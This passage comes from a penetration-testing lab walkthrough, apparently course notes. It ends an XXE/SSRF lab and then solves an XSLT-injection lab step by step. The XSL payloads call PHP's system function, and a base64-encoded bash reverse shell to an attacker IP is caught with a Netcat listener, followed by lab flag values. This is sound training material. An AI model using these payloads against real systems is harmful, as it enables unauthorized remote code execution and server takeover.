style="white-space:pre-wrap;word-break:break-all">cat /tmp/flag2
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d9809fa6-b589-4c70-9afe-eaf37a611558" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Flag 2: 173b0344950d28e8b5dc36dd462edaa9
+</code></pre><p id="da613b13-7c7e-4bb9-8656-4a97fda26b90" class="">With that, we conclude this lab. We have learned to leverage an XXE vulnerability to perform an SSRF attack. Using the SSRF attack, we interacted with an internal HTTP server, got hold of SSH keys for a user, and got shell access on the target machine.</p><h3 id="267ab988-0dd1-430d-aee5-bf8a3b443b9f" class=""><strong>References</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#references"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="139b848d-eed7-474f-8e3a-bd94795d4dff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1 - A4:2017-XML External Entities (XXE)
+2 - A10:2021 – Server-Side Request Forgery (SSRF)
+3 - XML CDATA
+
+1 - https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)
+2 - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+3 - https://www.w3resource.com/xml/CDATA-sections.php
+</code></pre><h2 id="1d8a6490-71d4-4a36-adc0-01f565ab6bf0" class=""><strong>Lab 2 - XSLT to Code Execution</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#lab-2---xslt-to-code-execution"></a></strong></h2><p id="53b2810a-0827-4686-94e1-268cee1670d4" class="">Solution</p><p id="8e2653d8-e44f-409b-a211-45c2cf313ce2" class="">Step 1: Open the lab link to access the Kali GUI instance.</p><p id="8eeb5673-5a45-40c7-862f-256a6dd002dd" class="">…</p><p id="c8c44a1e-ec57-46e4-90cc-5c40da9d7388" class="">Step 2: Check if the provided machine/domain is reachable.</p><p id="e837601b-9adf-4d29-925a-3b54f8f443c0" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="378abfff-3d10-4add-80df-fa15d51c6576" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ping -c3 demo.ine.local
+</code></pre><p id="02f646f0-99f9-49d7-88dc-dc39359c33ba" class="">The provided machine is reachable.</p><p id="8d597296-ef2f-46e6-8f10-09a9442bef34" class="">Step 3: Check open ports on the provided machine.</p><p id="3e401d8e-b87b-4286-8b83-dcae3f4858d6" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4298f413-2e7e-4e7f-878a-be36ae1b9415" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap -sS -sV demo.ine.local
+</code></pre><blockquote id="46ca312b-a2c3-48a4-98a3-eef01be22d17" class="">Apache web server is running on port 80 on the target machine.</blockquote><p id="2d38fb1a-66ca-4655-9f56-986b3a93d808" class="">Step 4: Check the web application stack.</p><p id="1045e8b5-65a6-496d-9533-b45f59f1d1a7" class="">We will use curl to check the response headers and identify the application stack:</p><p id="cbc1be26-da33-4fe9-8a05-9e2708c726f8" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2330e803-1fe7-49b0-abb9-b3d2ce41d85a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -I demo.ine.local
+</code></pre><blockquote id="76f8ffeb-5e3e-434f-bc6e-311d249ebadb" class="">Notice the output indicates the web server is Apache (which we already know from the Nmap scan), and the backend web application is PHP-based.</blockquote><p id="dd3bd4d8-c847-4791-afe3-dba742c2b06a" class="">Step 5: Check the web pages served on the target machine.</p><p id="718c6a70-0d00-4fa9-bad3-6452fd720c67" class="">Open the following URL in the browser:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cc4f9596-8f1c-4032-a9b0-3a77db127b4d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local/
+</code></pre><p id="3cc63524-fc60-491a-844c-890c814fab12" class="">An Online Transformation Service application is provided. It expects an XML and an XSL file to be uploaded by the user. After both the files are uploaded, the XML file is transformed according to the instructions in the XSL file.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="875ea309-dba4-4f44-9699-20f420f23397" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Information: XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.
+
+Reference: https://www.w3schools.com/xml/xsl_intro.asp
+</code></pre><p id="45c1db68-db2d-4361-be74-421260d85bd0" class="">Step 6: Save a test XML file and an XSL file to detect the backend XSLT engine information.</p><p id="409a05df-723c-4f91-ba57-36f9f1c390b0" class="">Save the following content as test.xml:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30f5907d-0b5c-47be-b816-0aeb13fbdbd4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># test.xml:
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;root&gt;Hello, World!&lt;/root&gt;
+</code></pre><p id="8651d27a-7bf8-4247-8c30-18555d08185c" class="">Save the following content as test.xsl:</p><p id="52009885-76b9-4067-8352-8258804d1ad5" class="">test.xsl:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1dc600d2-c91a-475e-80e3-b0ca65281f46" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;
+  &lt;xsl:output method=&quot;html&quot;/&gt;
+  &lt;xsl:template match=&quot;/&quot;&gt;
+  &lt;h2&gt;XSLT Engine Info:&lt;/h2&gt;
+  &lt;b&gt;Version:&lt;/b&gt;&lt;xsl:value-of select=&quot;system-property(&#x27;xsl:version&#x27;)&quot; /&gt;&lt;br/&gt;
+  &lt;b&gt;Vendor:&lt;/b&gt;&lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor&#x27;)&quot; /&gt;&lt;br/&gt;
+  &lt;b&gt;Vendor URL:&lt;/b&gt;&lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor-url&#x27;)&quot; /&gt;&lt;br/&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><p id="b646738e-aa4a-4b5d-9f74-9b56344201fd" class="">Notice the contents of the XSL file. It contains the xsl tags to pull the information about the XSLT engine used by the backend:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef012e2e-b17d-46a4-80f6-582565689786" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">xsl:version
+xsl:vendor
+xsl:vendor-URL
+</code></pre><p id="d11a312e-36d8-44df-a983-25526658b34f" class="">Step 7: Upload the saved XML file to the server.</p><p id="f269b40e-1033-4547-a705-4d561116f662" class="">Select the XML file to be uploaded:</p><ul id="2b94d3c3-e779-4831-ae62-0f212f131864" class="bulleted-list"><li style="list-style-type:disc">Upload the XML file to the server</li></ul><ul id="d3b63f98-8725-4cd9-90dd-a76e11793e4d" class="bulleted-list"><li style="list-style-type:disc">The XML file was successfully uploaded</li></ul><p id="0de9f050-e85b-4f42-8263-1a7fefffc8dc" class="">Step 8: Upload the saved XSL file to the server.</p><ul id="9d52cf4f-ca19-4955-a889-88b1e51d547e" class="bulleted-list"><li style="list-style-type:disc">Select the XSL file to be uploaded</li></ul><ul id="07fb10af-e34b-4501-aeea-21b0fd256d62" class="bulleted-list"><li style="list-style-type:disc">Upload the XSL file to the server</li></ul><blockquote id="c6727028-4c84-42f3-a71a-6a7eafead424" class="">The XSL file was successfully uploaded</blockquote><p id="9f59d488-aa4e-4b64-b36d-854f09aa179c" class="">Step 9: Transform the XML file according to the uploaded XSL file.</p><ul id="c6a87903-50a5-417a-ba35-4b00f85fb3da" class="bulleted-list"><li style="list-style-type:disc">Click on the transform button to process and transform the XML file according to the uploaded XSL file</li></ul><ul id="31a921f0-ad1b-4727-8ae9-4e559e609d24" class="bulleted-list"><li style="list-style-type:disc">We are redirected to the /transform.php page containing the XSLT engine details</li></ul><p id="2ca8d575-e4bf-41b1-b917-a2d812bef69f" class="">The backend is running XSLT version 1.0, and the vendor is libxslt, which is one of the popular and widely used XSLT processors.</p><p id="f44d7d2b-b204-4b41-834d-468ef50abad6" class="">Step 10: Exploiting XSLT processor to run arbitrary commands.</p><blockquote id="cc3fbc60-ab23-4126-bd62-f3777b48a8b9" class="">By now, we have understood that the backend is running PHP and using the libxslt processor. Also, the processor parses the user-supplied files without any sanitization, as far as we have used it.</blockquote><p id="50ff34a8-8410-476e-9a6e-0faa5dde8c6f" class="">Now we will try to execute PHP functions from the XSL file. This will only work if registerPHPFunctions is enabled for the XSLT processor, as shown in the following post: https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls</p><p id="4ae7c3a2-f6cf-4854-be70-5e08626a4044" class="">To try this, we will upload another XSL file. Head back to the index page of the application:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48991bdc-d35b-4212-aa1e-9971ca3b3b34" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local
+</code></pre><p id="96683165-c297-4592-b9fc-60d1ed4c8236" class="">Save the following content under the test.xslt file:</p><p id="ae289d4f-6bd0-4892-91e1-55990445d244" class="">test.xsl:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b021208c-1cd1-422c-8603-e5f38d0ce159" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;
+version=&quot;1.0&quot;&gt;
+&lt;!-- We add the PHP&#x27;s xmlns --&gt;
+  &lt;xsl:template match=&quot;/&quot;&gt;
+    &lt;html&gt;
+       &lt;!-- We use the php suffix to call the functions --&gt;
+       &lt;xsl:value-of select=&quot;php:function(&#x27;system&#x27;,&#x27;uname -a&#x27;)&quot; /&gt;
+       &lt;!-- Output: &#x27;Php Can Now Be Used In Xsl&#x27; --&gt;
+    &lt;/html&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><blockquote id="c9ee2343-18a6-4b5a-96a5-0900f1a9a75d" class="">Notice that we have specified the uname -a command to be executed via the PHP system function.</blockquote><p id="20b86daf-5f13-4e0d-8ff6-d6de00f90c02" class="">If the backend XSLT processing code has registered PHP functions, then the above code would run, and we will see the output of the uname -a command on the resulting page.</p><p id="a6091700-04e2-44d5-a608-d278a74fc15d" class="">Upload the modified XSL file:</p><ul id="92eac2f2-65b5-44f0-9807-9e49b964815a" class="bulleted-list"><li style="list-style-type:disc">Now click on the Transform! button</li></ul><ul id="8a463f6d-b829-4dd3-89bf-a48f88032d0e" class="bulleted-list"><li style="list-style-type:disc">Notice the output of the uname -a command is shown on the resulting page:</li></ul><blockquote id="837be9da-0e01-4d51-ab74-e1d07861d026" class="">This confirms the backend XSLT processing code has registered PHP functions. This configuration is inherently vulnerable because the user-supplied XSL files are processed as is, without any sanitization/filtering.</blockquote><p id="6a2e82ba-aa6b-4838-9df0-826a37a08797" class="">Step 11: Obtain a reverse shell on the target server.</p><p id="58971a27-bc2a-4e1d-b9b4-620715103555" class="">Check the IP address of the attacker machine:</p><p id="efac534a-4bd5-4000-a003-5757dcf40d1c" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef133849-c468-4c0e-9e21-4c6213abb759" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ip addr
+</code></pre><p id="b95b18f0-7603-43ac-86ff-75591e189768" class="">The IP address of the attacker machine is 192.170.91.2/24.</p><blockquote id="8080bbfa-6846-44e0-b090-8e70dbfabea5" class="">[Note] The IP address assigned to your Kali GUI instance would certainly be different. Please make sure to replace it in the subsequent commands.</blockquote><p id="0d015765-e0aa-4e5e-a70a-c2afa7cffb0c" class="">Next, we will base64-encode the reverse shell payload to avoid it being tampered with while uploading over HTTP:</p><p id="bd8f11b9-b13c-4468-b4b7-1137ba695929" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="be09c420-f668-44e4-b340-109c2033616d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo &quot;/bin/bash -c &#x27;bash -i&gt;&amp; /dev/tcp/192.170.91.2/54321 0&gt;&amp;1&#x27;&quot; | base64 -w0 ; echo
+</code></pre><blockquote id="a58202b0-a8e2-4225-8d0e-f029294033c0" class="">[Note] Make sure to replace the IP address in the above command.</blockquote><p id="b28a510b-0edb-43a9-8dc6-b4b5a9827036" class="">Add the reverse shell payload in the XSL file:</p><p id="fdd4a1d7-146e-4ddf-9afe-4a662bef3ec9" class="">test.xsl:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a33289f7-80ac-4b79-8fff-035bf1d8ed2a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;
+version=&quot;1.0&quot;&gt;
+&lt;!-- We add the PHP&#x27;s xmlns --&gt;
+  &lt;xsl:template match=&quot;/&quot;&gt;
+    &lt;html&gt;
+      &lt;!-- We use the php suffix to call the functions --&gt;
+      &lt;xsl:value-of select=&quot;php:function(&#x27;system&#x27;,&#x27;echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash&#x27;)&quot; /&gt;
+        &lt;!-- Output: &#x27;Php Can Now Be Used In Xsl&#x27; --&gt;
+      &lt;/html&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><blockquote id="e4ab48ed-8d07-4bcf-ab7e-ab6cc00ff532" class="">Notice we have added commands to decode and execute the reverse shell payload on the backend server.</blockquote><p id="bfc84a1a-57ed-4c8a-9120-918e79e4b30b" class="">Start a Netcat listener on the attacker machine:</p><p id="facf35e4-fed2-4cc9-9b5c-a1d11c0869e6" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="167a00ae-7516-47e1-b916-6c598b4f5e0b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvp 54321
+</code></pre><ul id="95a63dfa-d5b7-4355-8c02-8c832ba75c95" class="bulleted-list"><li style="list-style-type:disc">Upload the modified XSL file:</li></ul><ul id="13c39fc4-1718-4f27-99cf-4f94a67a0b35" class="bulleted-list"><li style="list-style-type:disc">Now click on the Transform! button</li></ul><ul id="7e37e2fb-92d1-448a-8b81-1147c80bff74" class="bulleted-list"><li style="list-style-type:disc">Notice the page keeps on loading</li></ul><ul id="20f90210-a69b-48a8-a432-710ffe28a511" class="bulleted-list"><li style="list-style-type:disc">Check the terminal where the Netcat listener was running</li></ul><blockquote id="f501d08f-f9f8-477f-8f76-898ff91403d0" class="">We have received back a reverse shell session from the target server.</blockquote><p id="12a0dc8a-10a5-4f8d-a8d1-d35a1c8072b7" class="">Step 12: Retrieve the flag.</p><p id="cd10a8b7-ce82-47ad-bbe2-919f1eeda778" class="">Now that we have a shell session on the target server, we can execute OS commands and perform some enumeration:</p><p id="a1aa050f-21c4-478c-bb35-21a1e704dda9" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eaadd1f0-c745-46bc-ade5-1c3a270e5e1b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">id
+ps aux
+</code></pre><p id="af17ddd9-8409-4d85-a9e4-966ca2a049ba" class="">Run the following command to locate the flag file:</p><p id="749add02-b6e1-4292-b905-2ef76ccc8ce9" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3f259c65-2217-4293-a42d-26ced212bb91" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">find / -iname *flag* 2&gt;/dev/null
+</code></pre><blockquote id="0b62c467-3e80-4ce1-8865-0bc2d1d46011" class="">The flag is present in the /flag.txt file.</blockquote><p id="f17abc7a-229b-4107-8fbe-321dec83c3cd" class="">Read the contents of the flag file:</p><p id="a4b7ed7e-d9b7-4f5b-ac38-a7a9b92b1df8" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="51bc28cc-2e82-4c23-8f30-ba5349757f00" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat /flag.txt
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4efcda35-9eb9-444a-962e-f47177057e23" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">FLAG: fdf9c7da429441eaa1620eceafc34d9f
